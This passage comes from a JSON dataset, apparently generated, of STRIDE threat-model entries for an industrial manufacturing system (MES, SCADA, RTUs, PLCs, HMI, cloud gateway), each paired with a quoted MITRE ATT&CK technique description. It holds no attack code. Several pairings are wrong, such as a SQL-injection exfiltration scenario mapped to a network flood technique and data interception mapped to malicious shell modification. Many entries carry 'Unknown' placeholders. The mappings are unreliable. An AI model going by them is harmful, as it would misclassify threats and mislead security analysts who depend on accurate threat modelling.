                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive production data stored in the cloud is accessed by an unauthorized user.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control measures on cloud storage.",
                    "Role": "Attacker",
                    "Condition": "Access controls are not sufficiently restrictive."
                },
                {
                    "Assumption": "Vulnerabilities in cloud infrastructure or APIs.",
                    "Role": "Attacker",
                    "Condition": "Exploitable vulnerabilities exist within the cloud infrastructure or APIs."
                },
                {
                    "Assumption": "Lack of encryption for stored data.",
                    "Role": "System Admin",
                    "Condition": "Stored data is either unencrypted or poorly encrypted."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, leading to potential leaks or industrial espionage.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "cloud storage",
                "unauthorized access",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of unencrypted data streams between field devices and RTUs by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encryption for communication channels.",
                    "Role": "Attacker",
                    "Condition": "Communication channels are not encrypted, allowing easy interception."
                },
                {
                    "Assumption": "Open and unprotected network access.",
                    "Role": "Attacker",
                    "Condition": "Networks allow attackers to monitor and capture data packets."
                },
                {
                    "Assumption": "Insufficient network monitoring.",
                    "Role": "System Admin",
                    "Condition": "Network traffic is not properly monitored for anomalous activities."
                }
            ],
            "Potential Impact": "Exposure of real-time data, leading to potential misuse or further attacks.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "field devices",
                "RTU",
                "unencrypted communication"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exfiltrates data from the MES database using SQL injection vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "Database inputs are not properly sanitized.",
                    "Role": "Attacker",
                    "Condition": "Inputs are not sanitized, allowing SQL injection attacks."
                },
                {
                    "Assumption": "Lack of database activity monitoring.",
                    "Role": "System Admin",
                    "Condition": "Database activities are not monitored for suspicious behavior."
                },
                {
                    "Assumption": "System is vulnerable to known SQL injection techniques.",
                    "Role": "Attacker",
                    "Condition": "The system has known or unknown SQL injection vulnerabilities."
                }
            ],
            "Potential Impact": "Extraction of sensitive data from the MES database, compromising operational security.",
            "MITRE ATT&CK Keywords": [
                "SQL injection",
                "database exfiltration",
                "MES",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack targeting the gateway, flooding it with requests and making it unavailable.",
            "Assumptions": [
                {
                    "Assumption": "Gateway has limited capacity to handle excessive requests.",
                    "Role": "Attacker",
                    "Condition": "The gateway cannot handle an overwhelming amount of requests."
                },
                {
                    "Assumption": "Insufficient DDoS mitigation mechanisms in place.",
                    "Role": "System Admin",
                    "Condition": "DDoS mitigation mechanisms are not effectively implemented."
                },
                {
                    "Assumption": "Attacker has sufficient resources to generate high traffic volumes.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to a botnet or other means to generate high volumes of traffic."
                }
            ],
            "Potential Impact": "Interruption of data transfer to and from the cloud, causing operational delays or failures.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "gateway",
                "traffic flood",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infection disrupts the operations of field devices, stopping data collection and control operations.",
            "Assumptions": [
                {
                    "Assumption": "Field devices lack adequate malware protection.",
                    "Role": "System Admin",
                    "Condition": "Malware protection solutions are not implemented on field devices."
                },
                {
                    "Assumption": "Vulnerabilities in device software.",
                    "Role": "Attacker",
                    "Condition": "Software vulnerabilities can be exploited to deploy malware."
                },
                {
                    "Assumption": "Network security can be bypassed to deploy malware.",
                    "Role": "Attacker",
                    "Condition": "Networks are inadequately secured, allowing malware deployment."
                }
            ],
            "Potential Impact": "Operational disruption due to loss of control and monitoring capabilities.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "field devices",
                "operational disruption",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Insider threat launches an attack on the HMI, making it unusable for legitimate operators.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient internal security controls.",
                    "Role": "Insider",
                    "Condition": "Internal security measures are weak or ineffective."
                },
                {
                    "Assumption": "HMI is connected to the wider network without sufficient segmentation.",
                    "Role": "Insider",
                    "Condition": "The HMI is accessible without strong perimeter protections."
                },
                {
                    "Assumption": "Logging and monitoring of internal user activities are inadequate.",
                    "Role": "Insider",
                    "Condition": "Insider activities are not adequately logged and monitored."
                }
            ],
            "Potential Impact": "Operators are unable to monitor and control manufacturing processes, leading to potential production halts.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "HMI",
                "user disruption",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Remote Services",
                "description": "Adversaries may leverage remote services to move between assets and network segments. These services are often used to allow operators to interact with systems remotely within the network, some examples are RDP, SMB, SSH, and other similar mechanisms. (Citation: Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer December 2017) (Citation: Dragos December 2017) (Citation: Joe Slowik April 2019) \n\nRemote services could be used to support remote access, data transmission, authentication, name resolution, and other remote functions. Further, remote services may be necessary to allow operators and administrators to configure systems within the network from their engineering or management workstations. An adversary may use this technique to access devices which may be dual-homed (Citation: Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer December 2017) to multiple network segments, and can be used for [Program Download](https://attack.mitre.org/techniques/T0843) or to execute attacks on control devices directly through [Valid Accounts](https://attack.mitre.org/techniques/T0859).\n\nSpecific remote services (RDP & VNC) may be a precursor to enable [Graphical User Interface](https://attack.mitre.org/techniques/T0823) execution on devices such as HMIs or engineering workstation software.\n\nBased on incident data, CISA and FBI assessed that Chinese state-sponsored actors also compromised various authorized remote access channels, including systems designed to transfer data and/or allow access between corporate and ICS networks.  (Citation: CISA AA21-201A Pipeline Intrusion July 2021)",
                "id": "attack-pattern--e1f9cdd2-9511-4fca-90d7-f3e92cfdd0bf",
                "technique_id": "T0886"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses privilege escalation exploits to gain admin rights on the MES server.",
            "Assumptions": [
                {
                    "Assumption": "System software is not up-to-date.",
                    "Role": "Attacker",
                    "Condition": "System software has known vulnerabilities that can be exploited."
                },
                {
                    "Assumption": "Inadequate privilege segregation among user roles.",
                    "Role": "System Admin",
                    "Condition": "User roles are not properly segregated, allowing escalation."
                },
                {
                    "Assumption": "Lack of security patches and updates.",
                    "Role": "System Admin",
                    "Condition": "Security patches and updates are not regularly applied."
                }
            ],
            "Potential Impact": "Unauthorized access to and control over critical manufacturing workflows and settings.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "admin rights",
                "MES",
                "server"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the SCADA system to gain administrative control over RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Exploitable vulnerabilities in the SCADA system.",
                    "Role": "Attacker",
                    "Condition": "SCADA system has vulnerabilities that can be exploited."
                },
                {
                    "Assumption": "Weak access controls and lack of segmentation in SCADA network.",
                    "Role": "System Admin",
                    "Condition": "Access controls are weak and networks are not properly segmented."
                },
                {
                    "Assumption": "Lack of continuous security monitoring and management.",
                    "Role": "System Admin",
                    "Condition": "Continuous security monitoring is not implemented effectively."
                }
            ],
            "Potential Impact": "Compromise of RTUs, allowing the attacker to manipulate industrial operations.",
            "MITRE ATT&CK Keywords": [
                "SCADA",
                "privilege escalation",
                "administrative control",
                "RTU"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious operator uses their basic access to exploit higher privilege functions within the field devices.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate access control enforcement.",
                    "Role": "System Admin",
                    "Condition": "Access control policies are not enforced rigorously."
                },
                {
                    "Assumption": "Insufficient monitoring of user activities.",
                    "Role": "System Admin",
                    "Condition": "User activities are not adequately monitored and logged."
                },
                {
                    "Assumption": "Field devices have hidden or undocumented higher privilege functions.",
                    "Role": "Attacker",
                    "Condition": "Field devices have functions that are not well-documented nor secured."
                }
            ],
            "Potential Impact": "Complete control over field devices, causing unexpected and potentially harmful industrial actions.",
            "MITRE ATT&CK Keywords": [
                "field devices",
                "privilege escalation",
                "unauthorized control",
                "malicious operator"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "10",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to the Control Center by impersonating a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "Authentication mechanisms are weak or non-existent",
                    "Role": "Security Administrator",
                    "Condition": "Authentication methods are either not implemented or have vulnerabilities."
                },
                {
                    "Assumption": "Attackers have prior knowledge of network protocols and user credentials",
                    "Role": "Threat Actor",
                    "Condition": "The network and credentials have been previously compromised."
                }
            ],
            "Potential Impact": "Unauthorized control and manipulation of manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "user impersonation",
                "network access",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends spoofed control commands to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "RTUs do not validate command authenticity",
                    "Role": "RTU Manufacturer",
                    "Condition": "Commands are accepted without proper validation."
                },
                {
                    "Assumption": "Network traffic is not encrypted",
                    "Role": "Network Administrator",
                    "Condition": "Data transmission occurs over unencrypted channels."
                }
            ],
            "Potential Impact": "Control commands could be altered, resulting in incorrect operations of field devices.",
            "MITRE ATT&CK Keywords": [
                "command injection",
                "network spoofing",
                "protocol manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and modifies communications between field devices and the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Field devices use default or no authentication",
                    "Role": "Field Device Manufacturer",
                    "Condition": "Authentication mechanisms are weak or absent."
                },
                {
                    "Assumption": "Attackers have physical access to the network",
                    "Role": "Threat Actor",
                    "Condition": "Physical security controls are inadequate."
                }
            ],
            "Potential Impact": "Unauthorized control of field devices leading to potential production downtime or safety hazards.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "communication interception",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the MES database.",
            "Assumptions": [
                {
                    "Assumption": "The database is accessible via weakly protected interfaces",
                    "Role": "Database Administrator",
                    "Condition": "Database access controls are minimal or misconfigured."
                },
                {
                    "Assumption": "User inputs are not properly sanitized",
                    "Role": "Application Developer",
                    "Condition": "Input validation and sanitation are not enforced."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to incorrect production orders and potential financial loss.",
            "MITRE ATT&CK Keywords": [
                "SQL injection",
                "data manipulation",
                "database tampering"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware of PLCs to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update processes are not secure",
                    "Role": "PLC Manufacturer",
                    "Condition": "Firmware updates can be performed without authentication."
                },
                {
                    "Assumption": "Attackers have network access to PLCs",
                    "Role": "Threat Actor",
                    "Condition": "PLCs are accessible over the network and are not adequately protected."
                }
            ],
            "Potential Impact": "Manipulated firmware can cause operational disruptions or equipment damage.",
            "MITRE ATT&CK Keywords": [
                "firmware injection",
                "device tampering",
                "control system sabotage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters configuration settings in the cloud storage system.",
            "Assumptions": [
                {
                    "Assumption": "Access controls to cloud services are weak",
                    "Role": "Cloud Service Administrator",
                    "Condition": "Permissions and access controls are not correctly configured."
                },
                {
                    "Assumption": "Audit logs are not monitored",
                    "Role": "Security Operations Team",
                    "Condition": "Logs do not get reviewed regularly to detect malicious activities."
                }
            ],
            "Potential Impact": "Altered configurations can lead to data loss or unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "cloud misconfiguration",
                "data tampering",
                "configuration manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending malicious control commands to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Lack of proper logging mechanisms",
                    "Role": "Network Administrator",
                    "Condition": "The system does not maintain comprehensive logs of operations and commands."
                },
                {
                    "Assumption": "Control commands are not signed",
                    "Role": "Security Architect",
                    "Condition": "Command authentication is not implemented."
                }
            ],
            "Potential Impact": "Inability to trace malicious actions back to the attacker complicates incident response and recovery.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "non-repudiation",
                "unauthorized command injection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies altering sensitive operational data in the MES database.",
            "Assumptions": [
                {
                    "Assumption": "Audit trails do not capture sufficient detail",
                    "Role": "Database Administrator",
                    "Condition": "Logs are not detailed enough to attribute changes to specific users."
                },
                {
                    "Assumption": "Database activities are not monitored in real-time",
                    "Role": "Security Operations Center",
                    "Condition": "There is no real-time monitoring of database actions."
                }
            ],
            "Potential Impact": "Difficulties in proving malicious intent or errors can affect accountability and lead to operational challenges.",
            "MITRE ATT&CK Keywords": [
                "audit trail tampering",
                "unauthorized data modification",
                "user action denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service provider denies a data breach that exposed sensitive manufacturing data.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not shared with the customer",
                    "Role": "Cloud Service Provider",
                    "Condition": "Customers do not have access to log details."
                },
                {
                    "Assumption": "No independent verification of security controls",
                    "Role": "Security Auditor",
                    "Condition": "No third-party audits are conducted on cloud security practices."
                }
            ],
            "Potential Impact": "Legal and financial implications due to inability to verify breach occurrence and scope.",
            "MITRE ATT&CK Keywords": [
                "cloud breach denial",
                "service provider repudiation",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data intercepted during transmission between RTUs and the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption",
                    "Role": "Network Architect",
                    "Condition": "Data is in plaintext over the network."
                },
                {
                    "Assumption": "Intrusion detection systems are not in place",
                    "Role": "Security Administrator",
